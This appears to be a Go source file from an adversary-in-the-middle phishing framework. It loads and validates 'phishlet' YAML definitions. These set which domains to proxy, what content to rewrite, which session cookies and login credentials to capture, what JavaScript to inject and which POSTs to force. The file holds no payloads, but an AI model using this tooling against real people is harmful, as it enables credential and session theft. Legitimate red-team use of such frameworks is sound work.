package phishlet

import (
	"bytes"
	"fmt"
	"os"
	"regexp"
	"strings"

	"gopkg.in/yaml.v3"

	"github.com/travisbale/mirage/internal/aitm"
)

// Loader reads phishlet YAML files, validates them, compiles all regexes,
// and performs template parameter substitution.
// The zero value is ready to use.
type Loader struct{}

// Load reads the YAML file at path and returns a fully compiled PhishletDef.
// It returns ErrTemplateRequired if the file declares template params —
// use LoadWithParams in that case.
//
// Errors from Load are always ParseErrors or ErrTemplateRequired.
func (l *Loader) Load(path string) (*aitm.PhishletDef, error) {
	raw, err := l.parseFile(path)
	if err != nil {
		return nil, err
	}
	if len(raw.Params) > 0 {
		return nil, ErrTemplateRequired
	}
	return l.compile(path, raw, nil)
}

// LoadWithParams reads the YAML file at path, substitutes the given params
// into all {key} placeholders, then validates and compiles the result.
//
// params must contain a value for every key declared in the phishlet's params
// section. Extra keys in params are silently ignored.
//
// LoadWithParams also works on non-template phishlets (empty params section)
// when params is empty or nil.
func (l *Loader) LoadWithParams(path string, params map[string]string) (*aitm.PhishletDef, error) {
	raw, err := l.parseFile(path)
	if err != nil {
		return nil, err
	}

	// Check for missing required params.
	if len(raw.Params) > 0 {
		var missing []string
		for key := range raw.Params {
			if _, ok := params[key]; !ok {
				missing = append(missing, key)
			}
		}
		if len(missing) > 0 {
			return nil, ErrMissingParams{Missing: missing}
		}
	}

	return l.compile(path, raw, params)
}

// parseFile reads and YAML-decodes a phishlet file into the raw struct.
// KnownFields mode is enabled so typos in field names are caught here.
func (l *Loader) parseFile(path string) (*rawPhishlet, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("reading phishlet file %q: %w", path, err)
	}

	var raw rawPhishlet
	dec := yaml.NewDecoder(bytes.NewReader(data))
	dec.KnownFields(true)
	if err := dec.Decode(&raw); err != nil {
		// YAML decoder errors include line numbers but not field paths.
		// We surface them as a single ParseError on the top-level field.
		return nil, ParseErrors{{
			File:    path,
			Field:   "(yaml)",
			Message: err.Error(),
		}}
	}

	return &raw, nil
}

// compile validates the raw phishlet, applies parameter substitution, compiles
// all regexes, and constructs the aitm.PhishletDef. All errors found are
// collected and returned together as ParseErrors.
func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string) (*aitm.PhishletDef, error) {
	var errs ParseErrors

	// ── Identity validation ──────────────────────────────────────────────────
	if raw.Name == "" {
		errs = append(errs, ParseError{File: path, Field: "name", Message: "required"})
	}
	if raw.Author == "" {
		errs = append(errs, ParseError{File: path, Field: "author", Message: "required"})
	}
	if raw.Version == "" {
		errs = append(errs, ParseError{File: path, Field: "version", Message: "required"})
	}

	// ── proxy_hosts ──────────────────────────────────────────────────────────
	if len(raw.ProxyHosts) == 0 {
		errs = append(errs, ParseError{
			File:    path,
			Field:   "proxy_hosts",
			Message: "at least one proxy_host is required",
		})
	}
	var proxyHosts []aitm.ProxyHost
	for i, ph := range raw.ProxyHosts {
		field := fmt.Sprintf("proxy_hosts[%d]", i)
		if ph.PhishSub == "" {
			errs = append(errs, ParseError{File: path, Field: field + ".phish_sub", Message: "required"})
		}
		if ph.OrigSub == "" {
			errs = append(errs, ParseError{File: path, Field: field + ".orig_sub", Message: "required"})
		}
		if ph.Domain == "" {
			errs = append(errs, ParseError{File: path, Field: field + ".domain", Message: "required"})
		}
		autoFilter := true
		if ph.AutoFilter != nil {
			autoFilter = *ph.AutoFilter
		}
		proxyHosts = append(proxyHosts, aitm.ProxyHost{
			PhishSubdomain: substitute(ph.PhishSub, params),
			OrigSubdomain:  substitute(ph.OrigSub, params),
			Domain:         substitute(ph.Domain, params),
			IsLanding:      ph.IsLanding,
			IsSession:      ph.IsSession,
			AutoFilter:     autoFilter,
		})
	}

	// ── sub_filters ──────────────────────────────────────────────────────────
	var subFilters []aitm.SubFilter
	for i, sf := range raw.SubFilters {
		field := fmt.Sprintf("sub_filters[%d]", i)
		if sf.Search == "" {
			errs = append(errs, ParseError{File: path, Field: field + ".search", Message: "required"})
			continue
		}
		searchPattern := substitute(sf.Search, params)
		re, compErr := regexp.Compile(searchPattern)
		if compErr != nil {
			errs = append(errs, ParseError{
				File:    path,
				Field:   field + ".search",
				Message: fmt.Sprintf("invalid regex: %v", compErr),
			})
			continue
		}
		subFilters = append(subFilters, aitm.SubFilter{
			Hostname:   substitute(sf.Hostname, params),
			MimeTypes:  sf.MimeTypes,
			Search:     re,
			Replace:    substitute(sf.Replace, params),
			WithParams: sf.WithParams,
		})
	}

	// ── auth_tokens ──────────────────────────────────────────────────────────
	if len(raw.AuthTokens) == 0 {
		errs = append(errs, ParseError{
			File:    path,
			Field:   "auth_tokens",
			Message: "at least one auth_token entry is required",
		})
	}
	var authTokens []aitm.TokenRule
	for i, at := range raw.AuthTokens {
		field := fmt.Sprintf("auth_tokens[%d]", i)
		tokenType := aitm.TokenTypeCookie
		switch strings.ToLower(at.Type) {
		case "", "cookie":
			tokenType = aitm.TokenTypeCookie
		case "body":
			tokenType = aitm.TokenTypeBody
		case "header":
			tokenType = aitm.TokenTypeHTTPHeader
		default:
			errs = append(errs, ParseError{
				File:    path,
				Field:   field + ".type",
				Message: fmt.Sprintf("unknown token type %q; must be cookie, body, or header", at.Type),
			})
		}
		if at.Domain == "" {
			errs = append(errs, ParseError{File: path, Field: field + ".domain", Message: "required"})
		}
		for j, key := range at.Keys {
			kField := fmt.Sprintf("%s.keys[%d]", field, j)
			if key.Name == "" {
				errs = append(errs, ParseError{File: path, Field: kField + ".name", Message: "required"})
				continue
			}
			nameRe, compErr := regexp.Compile(key.Name)
			if compErr != nil {
				errs = append(errs, ParseError{
					File:    path,
					Field:   kField + ".name",
					Message: fmt.Sprintf("invalid regex: %v", compErr),
				})
				continue
			}
			var searchRe *regexp.Regexp
			if key.Search != "" {
				searchRe, compErr = regexp.Compile(key.Search)
				if compErr != nil {
					errs = append(errs, ParseError{
						File:    path,
						Field:   kField + ".search",
						Message: fmt.Sprintf("invalid regex: %v", compErr),
					})
					continue
				}
			}
			authTokens = append(authTokens, aitm.TokenRule{
				Type:     tokenType,
				Domain:   substitute(at.Domain, params),
				Name:     nameRe,
				Search:   searchRe,
				HTTPOnly: key.HTTPOnly,
				Always:   key.Always,
			})
		}
	}

	// ── credentials ──────────────────────────────────────────────────────────
	credRules, credErrs := l.compileCredentials(path, raw.Credentials, params)
	errs = append(errs, credErrs...)

	// ── force_post ───────────────────────────────────────────────────────────
	var forcePosts []aitm.ForcePost
	for i, fp := range raw.ForcePosts {
		field := fmt.Sprintf("force_post[%d]", i)
		if fp.Path == "" {
			errs = append(errs, ParseError{File: path, Field: field + ".path", Message: "required"})
			continue
		}
		pathRe, compErr := regexp.Compile(substitute(fp.Path, params))
		if compErr != nil {
			errs = append(errs, ParseError{
				File:    path,
				Field:   field + ".path",
				Message: fmt.Sprintf("invalid regex: %v", compErr),
			})
			continue
		}
		var conds []aitm.ForcePostCondition
		for j, c := range fp.Conditions {
			cField := fmt.Sprintf("%s.conditions[%d]", field, j)
			keyRe, err := mustCompile(c.Key, path, cField+".key", &errs)
			if err != nil {
				continue
			}
			searchRe, err := mustCompile(c.Search, path, cField+".search", &errs)
			if err != nil {
				continue
			}
			conds = append(conds, aitm.ForcePostCondition{Key: keyRe, Search: searchRe})
		}
		var fparams []aitm.ForcePostParam
		for _, p := range fp.Params {
			fparams = append(fparams, aitm.ForcePostParam{
				Key:   substitute(p.Key, params),
				Value: substitute(p.Value, params),
			})
		}
		forcePosts = append(forcePosts, aitm.ForcePost{
			Path:       pathRe,
			Conditions: conds,
			Params:     fparams,
		})
	}

	// ── intercept ────────────────────────────────────────────────────────────
	var intercepts []aitm.InterceptRule
	for i, ic := range raw.Intercepts {
		field := fmt.Sprintf("intercept[%d]", i)
		if ic.Path == "" {
			errs = append(errs, ParseError{File: path, Field: field + ".path", Message: "required"})
			continue
		}
		pathRe, compErr := regexp.Compile(substitute(ic.Path, params))
		if compErr != nil {
			errs = append(errs, ParseError{
				File:    path,
				Field:   field + ".path",
				Message: fmt.Sprintf("invalid regex: %v", compErr),
			})
			continue
		}
		var bodyRe *regexp.Regexp
		if ic.BodySearch != "" {
			bodyRe, compErr = regexp.Compile(substitute(ic.BodySearch, params))
			if compErr != nil {
				errs = append(errs, ParseError{
					File:    path,
					Field:   field + ".body_search",
					Message: fmt.Sprintf("invalid regex: %v", compErr),
				})
				continue
			}
		}
		if ic.Status == 0 {
			errs = append(errs, ParseError{File: path, Field: field + ".status", Message: "required"})
		}
		intercepts = append(intercepts, aitm.InterceptRule{
			Path:        pathRe,
			BodySearch:  bodyRe,
			StatusCode:  ic.Status,
			ContentType: substitute(ic.ContentType, params),
			Body:        substitute(ic.Body, params),
		})
	}

	// ── js_inject ────────────────────────────────────────────────────────────
	var jsInjects []aitm.JSInject
	for i, ji := range raw.JSInjects {
		field := fmt.Sprintf("js_inject[%d]", i)
		var triggerPathRe *regexp.Regexp
		if ji.TriggerPath != "" {
			var compErr error
			triggerPathRe, compErr = regexp.Compile(substitute(ji.TriggerPath, params))
			if compErr != nil {
				errs = append(errs, ParseError{
					File:    path,
					Field:   field + ".trigger_path",
					Message: fmt.Sprintf("invalid regex: %v", compErr),
				})
				continue
			}
		}
		jsInjects = append(jsInjects, aitm.JSInject{
			TriggerDomain: substitute(ji.TriggerDomain, params),
			TriggerPath:   triggerPathRe,
			Script:        substitute(ji.Script, params),
		})
	}

	// ── Return early if any errors were found ────────────────────────────────
	if len(errs) > 0 {
		return nil, errs
	}

	return &aitm.PhishletDef{
		Name:        raw.Name,
		Author:      raw.Author,
		Version:     raw.Version,
		ProxyHosts:  proxyHosts,
		SubFilters:  subFilters,
		AuthTokens:  authTokens,
		Credentials: credRules,
		Login: aitm.LoginSpec{
			Domain: substitute(raw.Login.Domain, params),
			Path:   substitute(raw.Login.Path, params),
		},
		ForcePosts: forcePosts,
		Intercepts: intercepts,
		JSInjects:  jsInjects,
	}, nil
}

// compileCredentials validates and compiles the credentials section.
func (l *Loader) compileCredentials(path string, raw rawCredentials, params map[string]string) (aitm.CredentialRules, ParseErrors) {
	var errs ParseErrors

	compileRule := func(field string, r rawCredRule) (aitm.CredentialRule, bool) {
		if r.Key == "" && r.Search == "" {
			// Empty credential rule — skip silently (credentials section is optional).
			return aitm.CredentialRule{}, false
		}
		keyRe, err := regexp.Compile(substitute(r.Key, params))
		if err != nil {
			errs = append(errs, ParseError{
				File:    path,
				Field:   field + ".key",
				Message: fmt.Sprintf("invalid regex: %v", err),
			})
			return aitm.CredentialRule{}, false
		}
		searchRe, err := regexp.Compile(substitute(r.Search, params))
		if err != nil {
			errs = append(errs, ParseError{
				File:    path,
				Field:   field + ".search",
				Message: fmt.Sprintf("invalid regex: %v", err),
			})
			return aitm.CredentialRule{}, false
		}
		credType := r.Type
		if credType == "" {
			credType = "post"
		}
		return aitm.CredentialRule{Key: keyRe, Search: searchRe, Type: credType}, true
	}

	var rules aitm.CredentialRules

	if cr, ok := compileRule("credentials.username", raw.Username); ok {
		rules.Username = cr
	}
	if cr, ok := compileRule("credentials.password", raw.Password); ok {
		rules.Password = cr
	}
	for i, c := range raw.Custom {
		field := fmt.Sprintf("credentials.custom[%d]", i)
		if c.Name == "" {
			errs = append(errs, ParseError{File: path, Field: field + ".name", Message: "required"})
			continue
		}
		if cr, ok := compileRule(field, c.rawCredRule); ok {
			rules.Custom = append(rules.Custom, aitm.CustomCredentialRule{Name: c.Name, CredentialRule: cr})
		}
	}

	return rules, errs
}

// substitute replaces all {key} placeholders in s with the corresponding value
// from params. Unknown placeholders are left intact. If params is nil, s is
// returned unchanged.
func substitute(s string, params map[string]string) string {
	if len(params) == 0 || !strings.Contains(s, "{") {
		return s
	}
	result := s
	for k, v := range params {
		result = strings.ReplaceAll(result, "{"+k+"}", v)
	}
	return result
}

// mustCompile compiles pattern as a regex, appending a ParseError to errs on
// failure and returning a non-nil error. On success, err is nil.
func mustCompile(pattern, file, field string, errs *ParseErrors) (*regexp.Regexp, error) {
	re, err := regexp.Compile(pattern)
	if err != nil {
		*errs = append(*errs, ParseError{
			File:    file,
			Field:   field,
			Message: fmt.Sprintf("invalid regex: %v", err),
		})
		return nil, err
	}
	return re, nil
}
